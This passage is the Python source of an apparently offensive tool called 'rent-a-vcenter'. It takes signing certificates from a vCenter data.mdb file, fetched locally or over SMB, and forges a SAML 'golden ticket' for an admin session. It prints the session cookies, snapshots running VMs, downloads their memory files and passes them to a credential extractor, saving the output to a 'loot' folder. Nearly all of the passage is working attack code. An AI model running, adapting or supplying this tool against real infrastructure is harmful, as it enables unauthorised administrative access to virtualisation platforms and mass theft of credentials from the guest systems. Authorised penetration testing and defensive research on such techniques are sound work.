    if raw.upper() in ('N', ''):
        return ('new', None)
    if raw.isdigit():
        idx = int(raw) - 1
        if 0 <= idx < len(entries):
            return ('existing', entries[idx])

    print('[!] Invalid selection — creating new snapshot')
    return ('new', None)


# ─── snapshot enumeration ──────────────────────────────────────────────────────

def _parse_vmsd(text: str) -> list:
    """Parse .vmsd file text into a list of {stem, name, create_time} sorted oldest→newest."""
    entries = {}
    for line in text.splitlines():
        m = re.match(r'(snapshot\d+)\.(\w+)\s*=\s*"([^"]*)"', line.strip())
        if m:
            key, field, val = m.group(1), m.group(2), m.group(3)
            entries.setdefault(key, {})[field] = val

    result = []
    for snap_key in entries.keys():
        e = entries[snap_key]
        filename = e.get('filename', '')
        if not filename:
            continue
        stem = filename.rsplit('.', 1)[0] if '.' in filename else filename
        name = e.get('displayName', stem)
        hi   = int(e.get('createTimeHigh', '0') or '0')
        lo   = int(e.get('createTimeLow',  '0') or '0')
        ft   = ((hi & 0xFFFFFFFF) << 32) | (lo & 0xFFFFFFFF)
        ct   = datetime.utcfromtimestamp(ft / 10_000_000 - 11644473600) if ft > 0 else None
        result.append({'stem': stem, 'name': name, 'create_time': ct})
    result.sort(key=lambda e: e['create_time'] or datetime(1970, 1, 1))
    return result


def _discover_existing_snapshots(vc: 'VCenterSession', vm_name: str,
                                  snap_info: dict = None,
                                  verbose: bool = False) -> list:
    """Return existing snapshot entries [{stem, name, create_time}] sorted oldest→newest."""
    ds_names = []
    for path in ['/api/vcenter/datastore', '/rest/vcenter/datastore']:
        r = vc.get(path)
        if r.status_code == 200:
            data    = r.json()
            ds_list = data if isinstance(data, list) else data.get('value', [])
            ds_names = [ds.get('name', '') for ds in ds_list if ds.get('name')]
            if ds_names:
                break
    if not ds_names:
        ds_names = ['datastore1', 'esxi-nfs-datastore', 'vsanDatastore', 'local']

    dc_names   = ['ha-datacenter', 'Lab-DC', 'Datacenter', 'datacenter']
    snap_re    = re.compile(r'[Ss]napshot(\d+)\.(vmem|vmsn|vmss)$', re.I)
    found_dc   = None
    found_ds   = None
    by_num: dict = {}

    for dc in dc_names:
        for ds in ds_names:
            dir_url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}/'
                       f'?dcPath={urllib.parse.quote(dc)}&dsName={urllib.parse.quote(ds)}')
            try:
                r = vc._s.get(dir_url, auth=vc._ds_auth, timeout=5)
                if r.status_code != 200:
                    continue
                for n in re.findall(r'/([^/"?]+\.v(?:mem|msn|mss))(?:[?"&])', r.text, re.I):
                    m = snap_re.search(n)
                    if m:
                        num = int(m.group(1))
                        by_num.setdefault(num, []).append(n)
                if by_num:
                    found_dc, found_ds = dc, ds
                    break
            except Exception:
                pass
        if by_num:
            break

    if not by_num:
        return []

    if verbose:
        print(f'[v] Directory listing ({found_dc}/{found_ds}): '
              f'{sum(len(v) for v in by_num.values())} snapshot file(s) '
              f'across {len(by_num)} snapshot(s)')

    # Enrich with snapshot names + creation times
    # Primary: snap_info from soap_list_vms traversal (reliable ISO8601 timestamps)
    # Fallback: vmsd parsing (broken timestamps on vSphere 8.x, used when no VIM session)
    soap_info: dict = snap_info or {}

    vmsd_by_stem: dict = {}
    if not soap_info:
        vmsd_url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}'
                    f'/{urllib.parse.quote(vm_name)}.vmsd'
                    f'?dcPath={urllib.parse.quote(found_dc)}&dsName={urllib.parse.quote(found_ds)}')
        try:
            r = vc._s.get(vmsd_url, auth=vc._ds_auth, timeout=5)
            if r.status_code == 200 and r.text.strip():
                for e in _parse_vmsd(r.text):
                    vmsd_by_stem[e['stem']] = e
        except Exception:
            pass

    result = []
    for num in sorted(by_num.keys()):
        files = by_num[num]
        vmsn  = next((f for f in files if f.lower().endswith('.vmsn')), None)
        vmem  = next((f for f in files if f.lower().endswith('.vmem')), None)
        stem  = (vmsn.rsplit('.', 1)[0] if vmsn
                 else next(iter(files)).rsplit('.', 1)[0])
        if soap_info and num in soap_info:
            name = soap_info[num]['name']
            ct   = soap_info[num]['create_time']
        else:
            meta = vmsd_by_stem.get(stem, {})
            name = meta.get('name', stem)
            ct   = meta.get('create_time')
        result.append({'stem': stem, 'name': name, 'create_time': ct,
                       'has_memory': vmem is not None})
    return result


# ─── datastore download ─────────────────────────────────────────────────────────

def _download_memory_files(vc: 'VCenterSession', vm_name: str, vm_path: str,
                            output_dir: Path, verbose: bool = False,
                            target_names: list = None) -> list:
    output_dir.mkdir(parents=True, exist_ok=True)

    ds_names = []
    for path in ['/api/vcenter/datastore', '/rest/vcenter/datastore']:
        r = vc.get(path)
        if r.status_code == 200:
            data    = r.json()
            ds_list = data if isinstance(data, list) else data.get('value', [])
            ds_names = [ds.get('name', '') for ds in ds_list if ds.get('name')]
            if ds_names:
                break

    if not ds_names:
        ds_names = ['datastore1', 'esxi-nfs-datastore', 'vsanDatastore', 'local']

    dc_names = ['ha-datacenter', 'Lab-DC', 'Datacenter', 'datacenter']

    print(f'\n[*] Searching datastores for {vm_name} memory files...')
    downloaded = []

    for dc in dc_names:
        for ds in ds_names:
            dir_url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}/'
                       f'?dcPath={urllib.parse.quote(dc)}&dsName={urllib.parse.quote(ds)}')
            try:
                r = vc._s.get(dir_url, auth=vc._ds_auth, timeout=5)
                if r.status_code != 200:
                    continue
                all_names = list(dict.fromkeys(
                    re.findall(r'/([^/"?]+\.v(?:mem|msn|mss))(?:[?"&])', r.text, re.I)
                ))

                # Filter to specific target files, or fall back to highest snapshot number
                if target_names:
                    names = [n for n in all_names if n in target_names]
                    if not names:
                        continue
                else:
                    snap_re  = re.compile(r'[Ss]napshot(\d+)\.(vmem|vmsn|vmss)$', re.I)
                    by_num   = {}
                    non_snap = []
                    for n in all_names:
                        m = snap_re.search(n)
                        if m:
                            num = int(m.group(1))
                            by_num.setdefault(num, []).append(n)
                        else:
                            non_snap.append(n)
                    if by_num:
                        names = by_num[max(by_num)]
                    elif non_snap:
                        names = non_snap
                    else:
                        continue

                for fname in names:
                    url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}'
                           f'/{urllib.parse.quote(fname)}'
                           f'?dcPath={urllib.parse.quote(dc)}&dsName={urllib.parse.quote(ds)}')
                    try:
                        head = vc._s.head(url, auth=vc._ds_auth, timeout=3)
                        if head.status_code != 200:
                            continue
                        size = int(head.headers.get('Content-Length', 0))
                        dest = output_dir / fname
                        print(f'[+] Downloading {fname}  ({size >> 20} MB) ...')
                        _download_parallel(url, dest, vc._s, auth=vc._ds_auth)
                        downloaded.append(dest)
                    except OSError as e:
                        print(f'[-] {e}')
                        return downloaded
                    except Exception as e:
                        print(f'[-] Download error {fname}: {e}')
            except Exception:
                pass

        if downloaded:
            break

    if not downloaded:
        print('[-] No memory files found in the datastore browser.')

    return downloaded


# ─── argument parser ────────────────────────────────────────────────────────────

def parse_args():
    ap = argparse.ArgumentParser(
        prog='rent-a-vcenter',
        description='vCenter SAML golden ticket — session cookie, VM memory dump, credential extraction',
    )
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument('--local-path', metavar='PATH', dest='local_path',
                    help='data.mdb file, directory, or archive containing it')
    src.add_argument('-t', metavar='HOST|UNC',
                    help='SMB target — bare host (enumerate all shares) or UNC path (\\\\host\\share[\\path])')
    ap.add_argument('-u', metavar='USER', default='',
                    help='Username (SMB auth / SSO fallback)')
    ap.add_argument('-p', metavar='PASS', default=None,
                    help='Password (SMB auth / vCenter SSO fallback)')
    ap.add_argument('-d', metavar='DOMAIN', default=None,
                    help='Domain (SMB auth / SSO domain override)')
    ap.add_argument('--out', metavar='DIR', default='./loot',
                    help='Output directory (default: ./loot)')
    ap.add_argument('--timeout', metavar='SECONDS', type=int, default=600,
                    help='Snapshot task timeout in seconds (default: 600)')
    ap.add_argument('-v', '--verbose', action='store_true')
    return ap.parse_args()


# ─── main ───────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()
    work_dir   = Path(tempfile.mkdtemp(prefix='rav_'))
    output_dir = Path(args.out)
    try:
        if args.local_path:
            paths = discover_local(args.local_path)
        elif args.t:
            paths = discover_smb(args.t, args.u or '', args.p or '', args.d or '')

        mdb_path = resolve_mdb(paths, work_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        _mdb_dest = output_dir / 'data.mdb'
        if mdb_path.resolve() != _mdb_dest.resolve():
            shutil.copy2(mdb_path, _mdb_dest)
        sol_key, sol_cert = resolve_solution_creds(paths, verbose=args.verbose)
        key_pem, cert1_pem, cert2_pem, mdb_domain = certs_from_mdb(mdb_path, args.verbose)
        domain = args.d or mdb_domain

        target = extract_vcenter_fqdn_from_mdb(mdb_path)
        if not target:
            sys.exit('[-] Could not extract vCenter address from data.mdb')

        print(f'\n[+] vCenter: {target}')
        print('[1] Obtain admin session token')
        print('[2] Enumerate VMs and dump credentials')
        choice = input('[?] Select action (1/2): ').strip()
        if choice not in ('1', '2'):
            return

        hostname  = get_vcenter_hostname(target)
        authn_id  = get_saml_authn_request(target)
        signed    = build_and_sign_saml(target, hostname, domain,
                                        key_pem, cert1_pem, cert2_pem, authn_id)
        cname, cval, ui_session = saml_login(target, signed)

        print(f'\n[+] https://{target}/ui/')
        print(f'    {cname}={cval}')
        for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
            v = ui_session.cookies.get(extra)
            if v:
                print(f'    {extra}={v}')

        if choice == '1':
            return

        # choice == '2' — get VIM SOAP session and enumerate VMs
        vc = VCenterSession(target, cname, cval,
                            vcenter_pass=args.p,
                            domain=domain,
                            sol_key_pem=sol_key,
                            sol_cert_pem=sol_cert,
                            idp_cert_pem=cert1_pem,
                            ui_session=ui_session,
                            verbose=args.verbose)

        if vc._vim_cookie:
            print(f'    vmware_soap_session={vc._vim_cookie}')
        elif vc._cert_stale:
            print('[!] Backup cert is stale — VIM session unavailable')
            return

        if not vc._vim_cookie:
            print('[!] VIM session unavailable — cannot enumerate VMs')
            return

        vms = soap_list_vms(target, vc._vim_cookie, verbose=args.verbose)
        if not vms:
            print('[-] No VMs found')
            return

        running = [v for v in vms if v.get('power_state') in ('poweredOn', 'POWERED_ON')]
        if not running:
            print(f'[-] No running VMs ({len(vms)} powered-off)')
            return

        print(f'\n[*] Running VMs:')
        selected = _select_vms(running)

        if not selected:
            return

        output_dir.mkdir(parents=True, exist_ok=True)

        for vm in selected:
            vm_id   = vm.get('vm', '')
            vm_name = vm.get('name', vm_id)

            vmsd_snaps = _discover_existing_snapshots(vc, vm_name,
                                                       snap_info=vm.get('snapshots', {}),
                                                       verbose=args.verbose)
            snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps, vm_name)

            target_files = None
            if snap_choice == 'existing':
                stem         = snap_entry['stem']
                target_files = [f'{stem}.vmem', f'{stem}.vmsn']
            else:
                snap_task = soap_create_snapshot(target, vc._vim_cookie, vm_id,
                                                 verbose=args.verbose)
                if snap_task:
                    if not soap_wait_for_task(target, vc._vim_cookie, snap_task,
                                              timeout=args.timeout, verbose=args.verbose):
                        print('    [!] Snapshot did not complete — trying existing memory files')
                else:
                    print('    [!] Snapshot creation failed — trying existing memory files')

            if not (shutil.which('vmkatz') or shutil.which('vol')
                    or shutil.which('vol3') or shutil.which('volatility3')):
                print('[!] vmkatz not found — run install.sh to build it')
                print('[!] Skipping download (no credential extractor available)')
                continue

            files = _download_memory_files(vc, vm_name, vm.get('vmPath', ''),
                                           output_dir, args.verbose,
                                           target_names=target_files)

            if not files:
                print(f'[-] No memory files found for {vm_name}')
                continue

            vmem = [f for f in files if f.suffix == '.vmem']
            if not vmem:
                print(f'[-] vmem not found for {vm_name} — snapshot may not include memory')
                continue

            # Only remove the snapshot we created — never touch pre-existing ones
            if snap_choice == 'new' and vc._vim_cookie:
                soap_remove_all_snapshots(target, vc._vim_cookie, vm_id,
                                          verbose=args.verbose)

            _extract_creds(vmem[0], output_dir)

        print(f'\n[+] Done — output in {output_dir.resolve()}')

    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


if __name__ == '__main__':
    main()
